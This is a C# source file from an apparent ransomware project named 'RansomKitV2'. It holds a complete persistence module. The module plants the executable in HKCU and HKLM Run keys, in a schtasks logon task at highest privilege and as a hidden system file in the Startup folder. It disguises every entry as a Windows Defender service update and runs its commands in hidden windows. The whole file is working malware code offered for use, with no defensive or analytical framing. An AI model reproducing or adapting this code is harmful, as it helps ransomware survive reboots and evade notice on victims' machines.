using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace RansomKitV2
{
    // ══════════════════════════════════════════════════════════════
    //  Persistence
    //
    //  Installs the binary in three places so it survives any
    //  combination of: user logout, reboot, "start" menu toggle.
    //
    //  1. HKCU  Run key   — fires on every user login (no elevation)
    //  2. HKLM  Run key   — fires for all users       (needs elevation)
    //  3. Scheduled task  — ONLOGON, HIGHEST level     (schtasks)
    //  4. Startup folder  — hidden copy of the EXE
    // ══════════════════════════════════════════════════════════════

    static class Persistence
    {
        const string VALUE_NAME  = "WindowsDefenderServiceUpdate";
        const string TASK_NAME   = "\\Microsoft\\Windows\\WindowsDefenderServiceUpdate";
        const string STARTUP_EXE = "WinDefSvcUpd.exe";

        // ── Install ───────────────────────────────────────────────

        public static void Install(string exePath)
        {
            SetRegistry(exePath, Registry.CurrentUser);
            SetRegistry(exePath, Registry.LocalMachine);   // silently fails without elevation
            SetScheduledTask(exePath);
            SetStartupFolder(exePath);
        }

        // ── Uninstall (called after successful decryption) ────────

        public static void Uninstall()
        {
            DelRegistry(Registry.CurrentUser);
            DelRegistry(Registry.LocalMachine);
            DelScheduledTask();
            DelStartupFolder();
        }

        // ── Registry ──────────────────────────────────────────────

        static void SetRegistry(string exePath, RegistryKey hive)
        {
            try
            {
                using var key = hive.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key?.SetValue(VALUE_NAME, $"\"{exePath}\" --silent");
            }
            catch { }
        }

        static void DelRegistry(RegistryKey hive)
        {
            try
            {
                using var key = hive.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key?.DeleteValue(VALUE_NAME, throwOnMissingValue: false);
            }
            catch { }
        }

        // ── Scheduled task ────────────────────────────────────────

        static void SetScheduledTask(string exePath)
        {
            // Create a task that fires at any logon, runs as highest available
            // /sc ONLOGON  → trigger: user log on
            // /rl HIGHEST  → highest available privilege
            // /f           → force-overwrite if already exists
            RunHidden("schtasks.exe",
                $"/create " +
                $"/tn \"{TASK_NAME}\" " +
                $"/tr \"\\\"{exePath}\\\" --silent\" " +
                $"/sc ONLOGON " +
                $"/rl HIGHEST " +
                $"/f");
        }

        static void DelScheduledTask()
            => RunHidden("schtasks.exe", $"/delete /tn \"{TASK_NAME}\" /f");

        // ── Startup folder ────────────────────────────────────────

        static void SetStartupFolder(string exePath)
        {
            try
            {
                string startupDir = Environment.GetFolderPath(
                    Environment.SpecialFolder.Startup);
                string dest = Path.Combine(startupDir, STARTUP_EXE);

                File.Copy(exePath, dest, overwrite: true);

                // Hide from casual browsing
                File.SetAttributes(dest, FileAttributes.Hidden | FileAttributes.System);
            }
            catch { }
        }

        static void DelStartupFolder()
        {
            try
            {
                string dest = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    STARTUP_EXE);
                if (File.Exists(dest))
                {
                    File.SetAttributes(dest, FileAttributes.Normal);
                    File.Delete(dest);
                }
            }
            catch { }
        }

        // ── Helper ────────────────────────────────────────────────

        static void RunHidden(string exe, string args)
        {
            try
            {
                using var p = Process.Start(new ProcessStartInfo(exe, args)
                {
                    WindowStyle    = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                })!;
                p.WaitForExit(10_000);
            }
            catch { }
        }
    }
}
